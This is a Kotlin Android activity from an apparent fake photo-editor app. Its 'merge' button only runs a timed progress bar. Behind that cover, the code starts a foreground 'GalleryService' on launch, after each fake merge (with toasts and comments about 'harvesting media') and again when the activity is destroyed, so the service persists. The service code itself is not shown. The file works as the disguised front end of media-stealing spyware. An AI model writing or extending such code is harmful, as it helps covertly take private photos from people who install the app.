package com.magic.photoeditor

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Button
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MergeActivity : AppCompatActivity() {

    private lateinit var progressBar: ProgressBar
    private var isMerging = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_merge)

        progressBar = findViewById(R.id.progressBar)
        val btnMerge = findViewById<Button>(R.id.btnMerge)

        btnMerge.setOnClickListener {
            if (!isMerging) startMerge()
        }

        // Start service with delay to avoid crash
        Handler(Looper.getMainLooper()).postDelayed({
            startGalleryService()
        }, 1000)
    }

    private fun startMerge() {
        isMerging = true
        progressBar.visibility = ProgressBar.VISIBLE

        // Simulate merge progress
        Handler(Looper.getMainLooper()).postDelayed({
            progressBar.visibility = ProgressBar.GONE
            isMerging = false
            Toast.makeText(this, "Merge complete! Harvesting media...", Toast.LENGTH_SHORT).show()
            // Trigger harvest
            startGalleryService()
        }, 3000)
    }

    private fun startGalleryService() {
        try {
            val intent = Intent(this, GalleryService::class.java)
            startForegroundService(intent)
            Toast.makeText(this, "GalleryService started", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Toast.makeText(this, "Service error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (!isFinishing) {
            try {
                startGalleryService()
            } catch (e: Exception) {
                // ignore
            }
        }
    }
}
